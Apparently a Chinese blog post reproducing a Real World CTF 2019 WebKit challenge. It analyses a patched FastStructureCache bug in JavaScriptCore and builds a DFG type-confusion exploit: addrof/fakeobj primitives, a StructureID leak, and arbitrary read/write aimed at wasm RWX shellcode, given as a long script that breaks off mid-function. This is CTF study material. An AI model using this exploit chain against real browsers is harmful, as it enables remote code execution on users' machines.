# Realworld ctf 2019 final webkit FastStructCache 复现

阅读量 **376577**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-05-09 10:00:23

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t01f89e62894b2e0322.jpg)

学习 Webkit 的漏洞利用，19年realworld ctf final 出了一道 webkit 的题目 `FastStructCache`,
这里记录一下复现的过程。

完整的漏洞利用链需要逃逸webkit的沙箱，我手上木有mac，虚拟机装mac测试又是各种的问题，各种倒腾之后放弃了后半部的沙箱逃逸的利用，暂时只做了前面
jsc 部分的利用分析，等什么时候搞台mac之后回过头来看 🙁

## 环境配置

题目的原始文件可以从[这里](https://github.com/5lipper/ctf/tree/master/rwctf19-final/FastStructureCache)
下载，复现的环境是在 ubuntu 1804 下，

webkit 版本是 `commit 5ed80f740ac7b67ca9ddc43aae401bacc685c5e4`,
下载源码之后打上对应的patch然后编译出 jsc 就行了。但是我编译 debug 版本的时候跑不起来，会提示structureID
错误之类的，编译成Release版本就没有问题。调试用的 gdb

我自己复现用到的文件都放在了[这里](https://github.com/rtfingc/cve-repo/tree/master/0x06-realworldctf2019-final-faststructcache-side-effect),
包括存在漏洞和没有漏洞的两个版本，主要是方便自己运行比较。

## 漏洞分析

###  patch 分析

好的，我们看看给出的patch, 题目在`Source/JavaScriptCore/runtime`
下新创建了两个文件`FastStructureCache.cpp`和`FastStructureCache`,
添加了一个名为`FastStructureCache` 的类

    
    
    --- /dev/null
    +++ b/Source/JavaScriptCore/runtime/FastStructureCache.cpp
    @@ -0,0 +1,10 @@
    +#include "FastStructureCache.h"
    +
    +namespace JSC {
    +
    +FastStructureCache::FastStructureCache(VM& vm, Structure* structure)
    +    : JSNonFinalObject(vm, structure)
    +{
    +}
    +
    +}
    

这个类只有一个`createStructureFastPath` 方法, 初始化的时候会创建`fastCacheSizeMax == 16` 个
`Structure` 对象，保存在`fastCacheStructure` 里面，后面每次调用`createStructureFastPath`
直接就从这个cache 里面拿一个，如果拿完了的话就用`Structure::create` 新创建一个。

    
    
    --- /dev/null
    +++ b/Source/JavaScriptCore/runtime/FastStructureCache.h
    //...
    +class FastStructureCache final : public JSNonFinalObject {
    +public:
    +    using Base = JSNonFinalObject;
    +    static Structure** fastCacheStructure;
    +    static uint64_t fastCacheSizeMax;
    +    static uint64_t fastCacheSizeUsed;
    +
    +    static Structure* createStructureFastPath(VM& vm, JSGlobalObject* globalObject, JSValue prototype, const TypeInfo& typeInfo, const ClassInfo* classInfo)
    +    {    // 初始化 --> fastCacheSizeMax == 16
    +        if (fastCacheStructure == NULL) {
    +            fastCacheStructure = new Structure*[fastCacheSizeMax];
    +            uint64_t idx = 0;
    +            while (idx < fastCacheSizeMax) {
    +                // Later, we will set the correct globalObject and prototype
    +                fastCacheStructure[idx] = Structure::create(vm, globalObject, prototype, typeInfo, classInfo);
    +                idx++;
    +            }
    +        }
    +        if (fastCacheSizeUsed < fastCacheSizeMax) {
    +            Structure* return_value = fastCacheStructure[fastCacheSizeUsed];
    +            // set the correct global object and prototype
    +            return_value->setPrototypeWithoutTransition(vm, prototype);
    +            return_value->setGlobalObject(vm, globalObject);
    +            fastCacheSizeUsed += 1;
    +            return return_value;
    +        }
    +        return Structure::create(vm, globalObject, prototype, typeInfo, classInfo);
    +    }
    +
    +protected:
    +    FastStructureCache(VM&, Structure* structure);
    +};
    

`RegExpObject` 和`RegExpPrototype` 两个对象`createStructure`
都换成了用`FastStructureCache::createStructureFastPath` 来

    
    
    --- a/Source/JavaScriptCore/runtime/RegExpObject.h
    +++ b/Source/JavaScriptCore/runtime/RegExpObject.h
    //...
     class RegExpObject final : public JSNonFinalObject {
     //...
    static Structure* createStructure(VM& vm, JSGlobalObject* globalObject, JSValue prototype)
         {
    -        return Structure::create(vm, globalObject, prototype, TypeInfo(RegExpObjectType, StructureFlags), info());
    +        return FastStructureCache::createStructureFastPath(vm, globalObject, prototype, TypeInfo(RegExpObjectType, StructureFlags), info());
         }
    
    //........................................................................................
    --- a/Source/JavaScriptCore/runtime/RegExpPrototype.cpp
    +++ b/Source/JavaScriptCore/runtime/RegExpPrototype.cpp
    
    +Structure** FastStructureCache::fastCacheStructure = NULL;
    +uint64_t FastStructureCache::fastCacheSizeMax = 16;
    +uint64_t FastStructureCache::fastCacheSizeUsed = 0;
    
    //........................................................................................
    --- a/Source/JavaScriptCore/runtime/RegExpPrototype.h
    +++ b/Source/JavaScriptCore/runtime/RegExpPrototype.h
    
         static Structure* createStructure(VM& vm, JSGlobalObject* globalObject, JSValue prototype)
         {
    -        return Structure::create(vm, globalObject, prototype, TypeInfo(ObjectType, StructureFlags), info());
    +        return FastStructureCache::createStructureFastPath(vm, globalObject, prototype, TypeInfo(ObjectType, StructureFlags), info());
         }
    

总的来说就是预先分配了16个 `Structure` 对象，`RegExpPrototype` 和 `RegExpObject` 要创建的时候可以从里面拿。

###  漏洞分析

漏洞就发生在`FastStructureCache::createStructureFastPath` 的实现上啦，在获取`Structure`
对象的时候, 直接用`setPrototypeWithoutTransition` 设置`prototype`

    
    
    return_value->setPrototypeWithoutTransition(vm, prototype);
     return_value->setGlobalObject(vm, globalObject);
    

原版本的`Structure::create`
实现在[`Source/JavaScriptCore/runtime/StructureInlines.h#L39`](https://github.com/WebKit/webkit/blob/5ed80f740ac7b67ca9ddc43aae401bacc685c5e4/Source/JavaScriptCore/runtime/StructureInlines.h#L39)
上

    
    
    inline Structure* Structure::create(VM& vm, JSGlobalObject* globalObject, JSValue prototype, const TypeInfo& typeInfo, const ClassInfo* classInfo, IndexingType indexingModeIncludingHistory, unsigned inlineCapacity)
    {
        ASSERT(vm.structureStructure);
        ASSERT(classInfo);
        if (auto* object = prototype.getObject()) {
            ASSERT(!object->anyObjectInChainMayInterceptIndexedAccesses(vm) || hasSlowPutArrayStorage(indexingModeIncludingHistory) || !hasIndexedProperties(indexingModeIncludingHistory));
            object->didBecomePrototype();
        }
    
        Structure* structure = new (NotNull, allocateCell<Structure>(vm.heap)) Structure(vm, globalObject, prototype, typeInfo, classInfo, indexingModeIncludingHistory, inlineCapacity);
        structure->finishCreation(vm);
        return structure;
    }
    

在创建的时候会检查传进来的 `prototype` 是不是一个对象，如果是的话，需要调用`didBecomePrototype`
给这个对象设置一个flags，表示它已经是某个对象的`prototype` 了，如`a=[1.1] ; b = [1.1];` ，`a.__proto__
= b` 的时候， b 就会调用`didBecomePrototype` ， 它的实现如下:

    
    
    //..  Source/JavaScriptCore/runtime/JSObjectInlines.h
    inline void JSObject::didBecomePrototype()      
    {                                               
        setPerCellBit(true);                        
    }                                               
    // Source/JavaScriptCore/runtime/JSCellInlines.h
    inline void JSCell::setPerCellBit(bool value)                                       
    {                                                                                   
        if (value == perCellBit())                                                      
            return;                                                                                                                                                 
        if (value)                                                                      
            m_flags |= static_cast<TypeInfo::InlineTypeFlags>(TypeInfoPerCellBit);      
        else                                                                            
            m_flags &= ~static_cast<TypeInfo::InlineTypeFlags>(TypeInfoPerCellBit);     
    }
    // Source/JavaScriptCore/runtime/JSTypeInfo.h
    static constexpr unsigned TypeInfoPerCellBit = 1 << 7;
    

`m_flags` 是 `JSCell` 的 倒数第二个byte, `1<<7 = 0x80` 如下面的`0x0180170000001715` 倒数第二个
byte 就是 `0x80`， 表示它可能是某个对象的`prototype`, `0x01001700000009e3` 没有设置就不是啦。

    
    
    0x7fffb26d8020: 0x01001700000009e3      0x00007fe0197f0208 
    0x7fffb26d8030: 0x0180170000001715      0x00007fe0197fc5e8
    

`FastStructureCache` 初始化的时候都是使用的同一个`prototype` 来创建`Stucture` 对象，
后面要用的时候也是直接用`setPrototypeWithoutTransition` 来设置，并检查调用`didBecomePrototype`
的过程，所以假如还是一样`a=[1.1] ; b = [1.1];` ，`a.__proto__ = b` ， 执行结束之后 b JSCell 的
`m_flags` 并不会`|0x80`, 后续运行就可能会打破一些假设。

###  RegExp Structure 创建过程

在看实际的利用之前，我们先看看 `RegExpObject` 的 `Structure`
的创建过程，具体的细节我还不是十分的清楚，只能记录一些自己觉得比较重要的点。

找一下`RegExpObject::createStructure` 和`RegExpPrototype::createStructure`
的调用点，发现他们只在[Source/JavaScriptCore/runtime/JSGlobalObject.cpp#L709](https://github.com/WebKit/webkit/blob/5ed80f740ac7b67ca9ddc43aae401bacc685c5e4/Source/JavaScriptCore/runtime/JSGlobalObject.cpp#L709)
调用过

    
    
    % grep -iR 'RegExpObject::create' *    
    JSGlobalObject.cpp:    m_regExpStructure.set(vm, this, RegExpObject::createStructure(vm, this, m_regExpPrototype.get()));
    RegExpConstructor.cpp:    return RegExpObject::create(vm, structure, regExp);
    RegExpConstructor.cpp:        return RegExpObject::create(vm, structure, regExp);
    % grep -iR 'RegExpPrototype::create' *    
    JSGlobalObject.cpp:    m_regExpPrototype.set(vm, this, RegExpPrototype::create(vm, this, RegExpPrototype::createStructure(vm, this, m_objectPrototype.get())));
    %
    

在`JSGlobalObject::init` 初始化的时候，首先是调用`RegExpPrototype::createStructure`
这个时候`FastStructureCache` 完成初始化, 并返回`fastCacheStructure[0]`, 保存在
`m_regExpPrototype`。 接着调用`RegExpObject::createStructure`,
执行完会返回`fastCacheStructure[1]`保存在 `m_regExpStructure`, 传入的`prototype`
参数是前面创建的`m_regExpPrototype`, create 完成之后， 并不会给它的`prototype`
设置`setPerCellBit(true)`, 虽然它已经是`RegExpObject` 的`prototype` 。

    
    
    void JSGlobalObject::init(VM& vm){
    m_objectPrototype.get()->didBecomePrototype();
    //.....
    m_regExpPrototype.set(vm, this, RegExpPrototype::create(vm, this, RegExpPrototype::createStructure(vm, this, m_objectPrototype.get()))); 
    m_regExpStructure.set(vm, this, RegExpObject::createStructure(vm, this, m_regExpPrototype.get()));                                       
    m_regExpMatchesArrayStructure.set(vm, this, createRegExpMatchesArrayStructure(vm, this));    
    }
    

我们具体调试看看, 在`FastStructureCache::createStructureFastPath` 下个断点，跟一下内存

    
    
    b FastStructureCache::createStructureFastPath
    

找到 `FastCacheStructure` 保存的地方，它是在 heap 内存上, 创建了 16 个 `Structure` 对象

    
    
    pwndbg> vmmap 0x5555555a6960
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
        0x555555594000     0x5555555b5000 rw-p    21000 0      [heap]
    pwndbg> x/20gx 0x5555555a6960
    0x5555555a6960: 0x00007fffb26f2060      0x00007fffb26f20d0
    0x5555555a6970: 0x00007fffb26f2140      0x00007fffb26f21b0
    0x5555555a6980: 0x00007fffb26f2220      0x00007fffb26f2290
    0x5555555a6990: 0x00007fffb26f2300      0x00007fffb26f2370
    0x5555555a69a0: 0x00007fffb26f23e0      0x00007fffb26f2450
    0x5555555a69b0: 0x00007fffb26f24c0      0x00007fffb26f2530
    0x5555555a69c0: 0x00007fffb26f25a0      0x00007fffb26f2610
    0x5555555a69d0: 0x00007fffb26f2680      0x00007fffb26f26f0
    0x5555555a69e0: 0x0000000000000000      0x000000000000e621
    0x5555555a69f0: 0x0000000000000000      0x0000000000000000
    

第一次调用`RegExpPrototype::createStructure` , 会拿到第一个`Structure`,
也就是`0x00007fffb26f2060` 这个地址,
每个变量对应的位置可以看看`Source/JavaScriptCore/runtime/Structure.h`

    
    
    pwndbg> x/20gx 0x00007fffb26f2060
    0x7fffb26f2060: 0x0100000000002e74      0x0100170000007a64
                                         //m_globalObject
    0x7fffb26f2070: 0x0000001c00000000      0x00007fffb26e0000
                   //m_prototype
    0x7fffb26f2080: 0x00007fffb26d8000      0x0000000000000000
    0x7fffb26f2090: 0x0000000000000000      0x0000000000000000
                   // m_classInfo
    0x7fffb26f20a0: 0x00007ffff7d95b80      0x0000000000000001
    0x7fffb26f20b0: 0x00007fffb26cc060      0x0000000000000003
    0x7fffb26f20c0: 0x243e606800000074      0x0000000000000000
    0x7fffb26f20d0: 0x0100000000002e74      0x0100170000007baa
    

创建的时候传递给`RegExpPrototype` 的`prototype` 是`m_objectPrototype`,
它默认是设置了`TypeInfoPerCellBit` 的

    
    
    pwndbg> x/20gx 0x00007fffb26d8000                                                                     
    0x7fffb26d8000: 0x01801700000068d5      0x00007fe00dcf4088                                           
    0x7fffb26d8010: 0x0188240100007056      0x00007fe00dcec208
    

然后是`RegExpObject::createStructure` ， 它会拿到第二个`Structure`

    
    
    pwndbg> x/20gx 0x00007fffb26f20d0
    0x7fffb26f20d0: 0x0100000000002e74      0x0100170000007baa
                                        //m_globalObject
    0x7fffb26f20e0: 0x0000002000000000      0x00007fffb26e0000
                   //m_prototype
    0x7fffb26f20f0: 0x00007fffb26d8020      0x0000000000000000
    0x7fffb26f2100: 0x0000000000000000      0x0000000000000000
                    //m_classInfo
    0x7fffb26f2110: 0x00007ffff7d95b80      0x0000000000000001
    0x7fffb26f2120: 0x0000000000000000      0x0000000000000003
    0x7fffb26f2130: 0x00000000ffffffff      0x0000000000000000
    0x7fffb26f2140: 0x0100000000002e74      0x0100170000007c6e
    0x7fffb26f2150: 0x0000002000000000      0x00007fffb26e0000
    

看一下它的`prototype` 地址`0x00007fffb26d8020` ， 和我们分析的一样，它并没有设置`TypeInfoPerCellBit`

    
    
    pwndbg> x/20gx 0x00007fffb26d8020
    0x7fffb26d8020: 0x0100170000007a64      0x00007fe00dcf0208
    0x7fffb26d8030: 0x0180170000008b3f      0x00007fe00dcfc5e8
    

后续创建`RegExp` 对象的时候都是使用一开始创建的这个`Structure`(`0x7fffb26f20d0`),
也就是`FastCacheStructure[1]`, 其他的貌似不会用到，我也木有找到可以重新调用`createStructure`
的点，但是当前得到的信息已经足够了，我们继续看看怎么样利用

    
    
    >>> a=new RegExp()
    /(?:)/
    >>> describe(a)
    Object: 0x7fffb26e8100 with butterfly (nil) (Structure 0x7fffb26f20d0:[Object, {}, NonArray, Proto:0x7fffb26d8020, Leaf]), StructureID: 53331
    

## 漏洞利用

18年的时候`lokihardt` 提交了一个[`Proxy` 对象相关的洞](https://bugs.chromium.org/p/project-zero/issues/detail?id=1649)，里面提到的一个漏洞利用的思路可以用到这道题目上面来。

jsc 的native对象不允许在`prototype` 上设置`Proxy` ， 例如有一个对象`a= [1.1,2.2]`,
然后执行`a.__proto__=new Proxy({},{})`, 这时候会调用`JSObject::setPrototypeDirect` 函数

    
    
    void JSObject::setPrototypeDirect(VM& vm, JSValue prototype)
    {
        ASSERT(prototype);
        // prototype == new Proxy({},{})
        if (prototype.isObject())
            prototype.asCell()->didBecomePrototype();
    
        if (structure(vm)->hasMonoProto()) {
            DeferredStructureTransitionWatchpointFire deferred(vm, structure(vm));
            Structure* newStructure = Structure::changePrototypeTransition(vm, structure(vm), prototype, deferred);
            setStructure(vm, newStructure);
        } else
            putDirect(vm, knownPolyProtoOffset, prototype);
    
        if (!anyObjectInChainMayInterceptIndexedAccesses(vm))
            return;
    
        if (mayBePrototype()) {
            structure(vm)->globalObject()->haveABadTime(vm);
            return;
        }
    
        if (!hasIndexedProperties(indexingType()))
            return;
    
        if (shouldUseSlowPut(indexingType()))
            return;
    
        switchToSlowPutArrayStorage(vm);
    }
    

`Proxy` 对象会设置`TypeInfoPerCellBit`, 接着后面`mayBePrototype()` 会判断当前`JSObject`
是不是一个`prototype` ， 例如`a.__proto__.__proto__ = new Proxy({}, {})`,
是的话会调用`haveABadTime()`,
具体实现在[`Source/JavaScriptCore/runtime/JSGlobalObject.cpp#L1574`](https://github.com/WebKit/webkit/blob/5ed80f740ac7b67ca9ddc43aae401bacc685c5e4/Source/JavaScriptCore/runtime/JSGlobalObject.cpp#L1574)
上, 它会找出对象的所有依赖，然后`switchToSlowPutArrayStorage`
都转换成`ArrayWithSlowPutArrayStorage` 类型

    
    
    >>> a=[1.1,2.2]
    1.1,2.2
    >>> describe(a)
    Object: 0x7fffb26d8170 with butterfly 0x7ff84c8e4008 (Structure 0x7fffb26f1d50:[Array, {}, ArrayWithDouble, Proto:0x7fffb26d8010, Leaf]), StructureID: 22114
    >>> a.__proto__=new Proxy({},{})
    [object Object]
    >>> describe(a)
    Object: 0x7fffb26d8170 with butterfly 0x7ff84c8f8348 (Structure 0x7fffb26b0850:[Array, {}, ArrayWithSlowPutArrayStorage, Proto:0x7ffff2ac7f68, Leaf]), StructureID: 10472
    >>>
    

结合我们前面的分析`RegExpPrototype` 并没有设置`TypeInfoPerCellBit`, 这样我们就可以在native
对象的`prototype` 创建一个`Proxy` 对象而不会触发转换成`ArrayWithSlowPutArrayStorage` 类型，
在有漏洞和没有漏洞版本的 `jsc` 的测试结果如下

`无漏洞版本`

    
    
    >>> a=[1.1,2.2]
    1.1,2.2
    >>> describe(a)
    Object: 0x7fffb26d8170 with butterfly 0x7fe0179e4008 (Structure 0x7fffb26f1d50:[Array, {}, ArrayWithDouble, Proto:0x7fffb26d8010, Leaf]), StructureID: 39579
    >>> reg = new RegExp()
    /(?:)/
    >>> describe(reg)
    Object: 0x7fffb26e8120 with butterfly (nil) (Structure 0x7fffb26f20d0:[RegExp, {}, NonArray, Proto:0x7fffb26d8020, Leaf]), StructureID: 41496
    >>> a.__proto__=reg
    /(?:)/
    >>> describe(a)
    Object: 0x7fffb26d8170 with butterfly 0x7fe0179e4008 (Structure 0x7fffb26f3e20:[Array, {}, ArrayWithDouble, Proto:0x7fffb26e8120, Leaf]), StructureID: 59375
    >>> reg.__proto__.__proto__ = new Proxy({},{})
    [object Object]
    // 有依赖关系的 a 会被转换成 ArrayWithSlowPutArrayStorage 类型
    >>> describe(a)
    Object: 0x7fffb26d8170 with butterfly 0x7fe0179fbe88 (Structure 0x7fffb26a7e20:[Array, {}, ArrayWithSlowPutArrayStorage, Proto:0x7fffb26e8120, Leaf]), StructureID: 61156
    >>>
    

`漏洞版本`

    
    
    >>> a=[1.1,2.2]
    1.1,2.2
    >>> describe(a)
    Object: 0x7fffb26d8170 with butterfly 0x7ff815ee4008 (Structure 0x7fffb26f1d50:[Array, {}, ArrayWithDouble, Proto:0x7fffb26d8010, Leaf]), StructureID: 25564
    >>> reg = new RegExp()
    /(?:)/
    >>> describe(reg) 
    Object: 0x7fffb26e8120 with butterfly (nil) (Structure 0x7fffb26f20d0:[Object, {}, NonArray, Proto:0x7fffb26d8020, Leaf]), StructureID: 27086
    >>> a.__proto__=reg        
    /(?:)/
    >>> describe(a)
    Object: 0x7fffb26d8170 with butterfly 0x7ff815ee4008 (Structure 0x7fffb26b05b0:[Array, {}, ArrayWithDouble, Proto:0x7fffb26e8120, Leaf]), StructureID: 46253
    >>> reg.__proto__.__proto__ = new Proxy({},{})
    [object Object]
    // 并没有转换成 ArrayWithSlowPutArrayStorage
    >>> describe(a)
    Object: 0x7fffb26d8170 with butterfly 0x7ff815ee4008 (Structure 0x7fffb26b05b0:[Array, {}, ArrayWithDouble, Proto:0x7fffb26e8120, Leaf]), StructureID: 46253
    >>>
    

在 dfg 中，当调用`has` 函数， 也就是`0 in a` 这样的时候，会进入`case HasIndexedProperty`,
代码在[`Source/JavaScriptCore/dfg/DFGAbstractInterpreterInlines.h#L3842`](https://github.com/WebKit/webkit/blob/5ed80f740ac7b67ca9ddc43aae401bacc685c5e4/Source/JavaScriptCore/dfg/DFGAbstractInterpreterInlines.h#L3842)

    
    
        case HasIndexedProperty: {
            ArrayMode mode = node->arrayMode();
            switch (mode.type()) {
            case Array::Int32:
            case Array::Double:
            case Array::Contiguous:
            case Array::ArrayStorage: {
                break;
            }
            default: {
                clobberWorld();
                break;
            }
            }
            setNonCellTypeForNode(node, SpecBoolean);
            break;
        }
    

对于不是`Int32, Double, Contiguous, ArrayStorage`
的对象，如前面的`ArrayWithSlowPutArrayStorage` 类型，会有`clobberWorld`
来检查对象的转换，假如类似下面的代码，在`has` 函数里把`b[0]` 改成了一个对象，进入 dfg 之后因为之前的漏洞`a`
仍被认为是`ArrayWithDouble` 类型，不会调用`clobberWorld`, 然后 jsc 后面就会把 `b[0]` 当做一个double
类型来处理， 于是就有了地址泄露，同样的，我们也可以它来构造`fakeobj`

    
    
    a= [1.1,2.2];
    reg = new RegExp();
    a.__proto__ = reg;
    b = [1.1,2.2];
    reg.__proto__.__proto__ =  new Proxy({}, { 
      has() {                                    
          b[0] = {};
        return true;
      }
    });
    //... --> in dfg
    delete a[0];
    let tmp = 0 in a;
    

###  addrof/fakeobj 构造

根据前面的分析，其实`addrof` 和 `fakeobj` 的构造思路已经有了，就是借助dfg 的时候的has函数形成一个类型混淆，
参考[官方writeup](https://zhuanlan.zhihu.com/p/96069221) 给出的 poc， 下面是我的实现

    
    
    let arrays = [];
    let regexp = new RegExp();
    let leakme = [{}];
    let jit_mode = 0;
    
    var global_arr = [1.1, 2.2];
    
    const MAX_ARRAYS = 100;
    for (let i = 0; i < MAX_ARRAYS; i++) {
      arrays.push([1.1, 2.2]);
    }
    for (let i = 0; i < MAX_ARRAYS; i++) {
      arrays[i].__proto__ = regexp;
    }
    
    regexp.__proto__.__proto__ = new Proxy({}, {
      has() {
        if (jit_mode === 0) {
          global_arr[0] = leakme[0];
        }
        else if (jit_mode === 1) {
          global_arr[1] = {};
        }
        return true;
      }
    });
    

首先创建100 个`ArrayWithDouble` 类型的对象，其`prototype` 都设置成`regexp`, 然后是 `addrof` 的实现

    
    
    function addrof(obj){
        function leak_opt(arr, arr2) {
          let tmp = 0 in arr2;
          return [tmp, arr[0]];
        }
        jit_mode = 0;
        global_arr=[1.1,2.2];
        leakme[0]= obj;
        let arr = arrays.pop();
        for (let i = 0; i < 10000; i++) {
          leak_opt(global_arr, arr);
        }
        delete arr[0];
        return f2i(leak_opt(global_arr,arr)[1])
    }
    

`leak_opt` 运行`10000` 次让它进入`dfg`, 传入前面创建的`ArrayWithDouble` 对象，`delete arr[0]` ，
然后执行`tmp = 0 in arr2;` 的时候就会遍历`arr` 的prototype，然后调用到`regexp` 的 `Proxy`
对象，`leakme[0] = obj` , obj 是要泄露地址的对象，进入dfg 之后会执行`global_arr[0] = leakme[0];` ,
因为没有检查类型转换，所以可以直接从`global_arr[0]` 中读取出对象的地址。

`fakeobj` 的实现也是类似

    
    
    function fakeobj(addr){
        function fake_opt(arr,arr2,fake_addr){
            let tmp = 0 in arr2;
            arr[1] =  fakeme;
            return tmp;
        }
        jit_mode = 1;
        global_arr = [1.1,2.2];
        let fakeme = i2f(addr);
        let arr = arrays.pop();
        for(let i=0;i<10000;i++){
            fake_opt(global_arr,arr,fakeme);
        }
        delete arr[0];
        fake_opt(global_arr,arr,fakeme);
        return global_arr[1];
    }
    

传入一个地址，然后让`fake_opt` 进入dfg, dfg 里`global_arr[1]` 会被认为是一个对象，改成传入的地址之后就可以伪造对象啦。

###  StructureID randomize 绕过

`addrof` 和 `fakeobj` 构造完成之后，后续的利用基本上就都是套路了，网上找到很多利用代码，基本上就是伪造`ArrayWithDouble`
对象，然后改`butterfly` 到 任意地址读写。伪造`ArrayWithDouble` 对象需要一个可用的 `StructureID`,
之前的做法是喷一堆的`ArrayWithDouble` 对象，然后随机拿一个，刚好这个`id` 是可用的拿就完事了。

题目所用的webkit 版本加上了`StructureID`的[`7-bit
entropy`](https://github.com/WebKit/webkit/commit/a3099ac234f670a66b256ce39c94e9b3e31fc779)
, 简单来说就是 原先的`StructureID` 加上了 7个bit 的随机数，跟ASLR 类似，像前面运行的时候

    
    
    >>> describe(a)
    Object: 0x7fffb26d8170 with butterfly 0x7ff815ee4008 (Structure 0x7fffb26b05b0:[Array, {}, ArrayWithDouble, Proto:0x7fffb26e8120, Leaf]), StructureID: 46253
    >>>
    

`StructureID` 是一个很大的数`46253 == 0xb4ad` , 最后七个 bit 是随机生成的， 这样要找可用的
id就变得更加的困难，但是`1<< 7 == 128`, `1/128` 这个概率也不算很低，我们同样可以喷一堆的 `ArrayWithDouble`
对象，然后拿一个重复运行总会有命中的时候。

Blackhat EU 2019 上阿里的`[@ThomasKing2014](https://github.com/ThomasKing2014
"@ThomasKing2014")` 也讲了一个[利用内置函数泄露`StructureID`
的方法](https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf)

原理基本上就是并不是所有的内置函数都会用到 `StructureID`,
我们可以伪造这些函数用到的对象，控制它的执行流程。具体的实现如下，`Function.prototype.toString.call` 会打印出函数的源码，
伪造一个`Function`
对象，然后在获取函数名称的时候(`function->name(vm)`)会找`unlinked_function_executable.m_identifier`,
我们把它指向了`container+0x10` 也就是我们伪造的function object, 它会在`container.btfly`
上获取函数名对应的字符串， 把它指向一个`ArrayWithDouble` 对象我们就可以泄露出它的`StructureID` 啦

    
    
    var arr_leak = new Array(1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);
    function leakid(){
        var unlinked_function_executable = {
            m_isBuitinFunction: i2f(0xdeadbeef),
            pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6,
            m_identifier: {},
        };
    
        var fake_function_executable = {
          pad0: 0, pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6, pad7: 7, pad8: 8,
          m_executable: unlinked_function_executable,
        };
    
        var container = {
          jscell: i2f(0x00001a0000000000),
          btfly: {},
          pad: 0,
          m_functionExecutable: fake_function_executable,
        };
    
        var fake_addr = addrof(container)+0x10;
        fake_o = fakeobj(fake_addr);
        unlinked_function_executable.m_identifier = fake_o; 
        container.btfly = arr_leak; 
        var name_str = Function.prototype.toString.call(fake_o);
        return name_str.charCodeAt(9); 
    
    }
    

###  任意地址读写 -> 写wasm getshell

有了可用的`StructureID` 之后，后面就是 搞任意地址读写，然后写 wasm 的 rwx 段getshell
。这一部分的利用代码基本上都差不多，这里不再赘述，具体参考后面完整的exp

## exp

    
    
    var conversion_buffer = new ArrayBuffer(8)
    var f64 = new Float64Array(conversion_buffer)
    var i32 = new Uint32Array(conversion_buffer)
    
    var BASE32 = 0x100000000
    function f2i(f) {
        f64[0] = f
        return i32[0] + BASE32 * i32[1]
    }
    
    function i2f(i) {
        i32[0] = i % BASE32
        i32[1] = i / BASE32
        return f64[0]
    }
    
    function hex(addr){
        return addr.toString(16);
    }
    
    let arrays = [];
    let regexp = new RegExp();
    let leakme = [{}];
    let jit_mode = 0;
    
    var global_arr = [1.1, 2.2];
    
    const MAX_ARRAYS = 100;
    for (let i = 0; i < MAX_ARRAYS; i++) {
      arrays.push([1.1, 2.2]);
    }
    for (let i = 0; i < MAX_ARRAYS; i++) {
      arrays[i].__proto__ = regexp;
    }
    
    regexp.__proto__.__proto__ = new Proxy({}, {
      has() {
        if (jit_mode === 0) {
          global_arr[0] = leakme[0];
        }
        else if (jit_mode === 1) {
          global_arr[1] = {};
        }
        return true;
      }
    });
    
    function addrof(obj){
        function leak_opt(arr, arr2) {
          let tmp = 0 in arr2;
          return [tmp, arr[0]];
        }
        jit_mode = 0;
        global_arr=[1.1,2.2];
        leakme[0]= obj;
        let arr = arrays.pop();
        for (let i = 0; i < 10000; i++) {
          leak_opt(global_arr, arr);
        }
        delete arr[0];
        return f2i(leak_opt(global_arr,arr)[1])
    }
    
    function fakeobj(addr){
        function fake_opt(arr,arr2,fake_addr){
            let tmp = 0 in arr2;
            arr[1] =  fakeme;
            return tmp;
        }
        jit_mode = 1;
        global_arr = [1.1,2.2];
        let fakeme = i2f(addr);
        let arr = arrays.pop();
        for(let i=0;i<10000;i++){
            fake_opt(global_arr,arr,fakeme);
        }
        delete arr[0];
        fake_opt(global_arr,arr,fakeme);
        return global_arr[1];
    }
    
    
    
    let a=[13.37,13.37];
    a[0]={};
    print(addrof(a).toString(16))
    var arr_leak = new Array(1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);
    function leakid(){
        var unlinked_function_executable = {
            m_isBuitinFunction: i2f(0xdeadbeef),
            pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6,
            m_identifier: {},
        };
    
        var fake_function_executable = {
          pad0: 0, pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6, pad7: 7, pad8: 8,
          m_executable: unlinked_function_executable,
        };
    
        var container = {
          jscell: i2f(0x00001a0000000000),
          btfly: {},
          pad: 0,
          m_functionExecutable: fake_function_executable,
        };
    
        var fake_addr = addrof(container)+0x10;
        fake_o = fakeobj(fake_addr);
        unlinked_function_executable.m_identifier = fake_o; 
        container.btfly = arr_leak; 
        var name_str = Function.prototype.toString.call(fake_o);
        return name_str.charCodeAt(9); 
    
    }
    
    var victim=[13.37];
    victim[0]=13.37;
    victim['prop']=13.37;
    victim['prop1']=13.37;
    var id = leakid();
    
    i32[0]=id;
    i32[1]=0x01082307 -  0x20000;
    var container={
        JSCell: f64[0],
        butterfly: victim,
    };
    container_addr = addrof(container);
    
    hax = fakeobj(container_addr+0x10)
    print(describe(container))
    
    var unboxed = [1.1];
    unboxed[0]=3.3;
    
    var boxed = [{}];
    
    print('-----')
    print(describe(unboxed))
    print(describe(boxed))
    print('-----')
    hax[1] = i2f(addrof(unboxed));
    var shared = victim[1];
    hax[1] = i2f(addrof(boxed))
    victim[1] = shared;
    print(describe(unboxed))
    print(describe(boxed))
    
    
    
    var stage2={
        addrof: function(obj){
            boxed[0]=obj;
            return f2i(unboxed[0])
        },
        fakeobj: function(addr){
            unboxed[0]=i2f(addr)
            return boxed[0]
        },
        read64:function(addr){
            hax[1]=i2f(addr+0x10)
            return this.addrof(victim.prop)
        },
        write64:function(addr,data){
            hax[1]=i2f(addr+0x10)
            victim.prop = this.fakeobj(data)
        },
        write: function(addr, shellcode) {
            var theAddr = addr;
            for(var i=0;i<shellcode.length;i++){
                this.write64(addr+i,shellcode[i].charCodeAt())
            }
        },
        pwn:function(){
